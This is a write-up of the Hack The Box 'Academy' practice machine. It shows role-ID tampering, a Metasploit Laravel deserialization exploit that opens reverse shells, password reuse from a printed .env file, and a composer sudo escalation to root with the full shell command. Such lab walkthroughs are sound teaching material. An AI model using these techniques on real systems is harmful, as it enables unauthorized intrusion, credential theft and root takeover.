---
layout: post
category: writeup
---

## Machine Info

- Name: Academy
- Description: Academy is an easy difficulty Linux machine that features an Apache server hosting a PHP website. The website is found to be the HTB Academy learning platform. Capturing the user registration request in Burp reveals that we are able to modify the Role ID, which allows us to access an admin portal. This reveals a vhost, that is found to be running on Laravel. Laravel debug mode is enabled, the exposed API Key and vulnerable version of Laravel allow us carry out a deserialization attack that results in Remote Code Execution. Examination of the Laravel `.env` file for another application reveals a password that is found to work for the `cry0l1t3` user, who is a member of the `adm` group. This allows us to read system logs, and the TTY input audit logs reveals the password for the `mrb3n` user. `mrb3n` has been granted permission to execute composer as root using `sudo`, which we can leverage in order to escalate our privileges.
- Difficulty: Easy

## Initial Access

Nmap:
```bash
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
```

Upon accessing the webpage, I see a register page:

![](assets/images/2024-02-20-HTB-Academy-Writeup-image-1.png)

I always try to capture the request,  so I'll capture the request:
![](assets/images/2024-02-20-HTB-Academy-Writeup-image-2.png)

This has an interesting parameter, roleid, let me try to change that to a 1 and send it in. Upon first inspection, it didn't seem like it did anything, but let's check on our dirsearch:

```bash
 dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u http:/
/academy.htb/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, txt, html | HTTP method: GET | Threads: 64 | Wordlist size: 1102725

Output File: /home/kali/HTB/reports/http_academy.htb/__24-02-20_07-25-34.txt

Target: http://academy.htb/

[07:25:34] Starting: 
[07:25:35] 301 -  311B  - /images  ->  http://academy.htb/images/           
[07:25:35] 403 -  276B  - /images/
[07:25:35] 302 -   54KB - /home.php  ->  login.php                          
[07:25:36] 200 -  964B  - /login.php                                        
[07:25:36] 200 - 1001B  - /register.php                                     
[07:25:37] 403 -  276B  - /icons/                                           
[07:25:41] 200 -  968B  - /admin.php                                        
[07:25:54] 200 -    0B  - /config.php
```

This shows us an admin page, when I access it, it requires me to login. So I use the same credentials and it lets me login! The 1 I guess means admin and the 0 means non-admin. 

![](assets/images/2024-02-20-HTB-Academy-Writeup-image-3.png)

Ahh, this shows us a subdomain, I'll add it to my vhost and access it:

![](assets/images/2024-02-20-HTB-Academy-Writeup-image-4.png)

Accessing it shows me an error in what seems to be a laravel app, let me see if I can figure out the version and exploit it!

Upon inspecting the page closer, I find the app key in clear text:

![](assets/images/2024-02-20-HTB-Academy-Writeup-image-5.png)

There is a laravel exploit due to the exposure of the app key! Let's attempt to exploit it!

```bash
msf6 exploit(unix/http/laravel_token_unserialize_exec) > run

[*] Started reverse TCP handler on 10.10.14.12:4444 
[*] Command shell session 1 opened (10.10.14.12:4444 -> 10.10.10.215:53016) at 2024-02-20 07:35:36 -0500

[*] Command shell session 2 opened (10.10.14.12:4444 -> 10.10.10.215:53018) at 2024-02-20 07:35:37 -0500
[*] Command shell session 3 opened (10.10.14.12:4444 -> 10.10.10.215:53020) at 2024-02-20 07:35:37 -0500
[*] Command shell session 4 opened (10.10.14.12:4444 -> 10.10.10.215:53022) at 2024-02-20 07:35:38 -0500
whoami
www-data
ls
css
favicon.ico
index.php
js
robots.txt
web.config
```

I got a shell!
## Privilege Escalation

Doing my regular enum, I notice a file that stands out:

```bash
www-data@academy:/var/www/html/academy$ cat .env
cat .env
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
APP_DEBUG=false
APP_URL=http://localhost

LOG_CHANNEL=stack

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!

BROADCAST_DRIVER=log
CACHE_DRIVER=file
SESSION_DRIVER=file
SESSION_LIFETIME=120
QUEUE_DRIVER=sync

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_DRIVER=smtp
MAIL_HOST=smtp.mailtrap.io
MAIL_PORT=2525
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
```

This has some database credentials, before I use it there, I also noticed we have a bunch of users on the machine, I want to see if I can login as any of them!

```bash
21y4d  ch4p  cry0l1t3  egre55  g0blin  mrb3n
www-data@academy:/home$ su 21y4d
su 21y4d
Password: mySup3rP4s5w0rd!!

su: Authentication failure
www-data@academy:/home$ su ch4p
su ch4p
Password: mySup3rP4s5w0rd!!

su: Authentication failure
www-data@academy:/home$ su cry0l1t3
su cry0l1t3
Password: mySup3rP4s5w0rd!!

$ whoami
whoami
cry0l1t3
```

Going down the list, I eventually get cry0l1t3!

I look at my groups and see I am in the adm group, I also see that we have audit logs installed so I take a look there and find a new set of creds!
![](assets/images/2024-02-20-HTB-Academy-Writeup-image-6.png)

I change users and check sudo privileges:

```bash
mrb3n@academy:~$ sudo -l
sudo -l
[sudo] password for mrb3n: mrb3n_Ac@d3my!

Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
```

That's a GTFOBin so I'll go ahead and exploit it!

```bash
mrb3n@academy:~$ TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script xTF=$(mktemp -d)
mrb3n@academy:~$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
mrb3n@academy:~$ 
sudo composer --working-dir=$TF run-script x
PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
Do not run Composer as root/super user! See https://getcomposer.org/root for details
> /bin/sh -i 0<&3 1>&3 2>&3
# whoami
whoami
root
#
```

We are root!

best,
gerbsec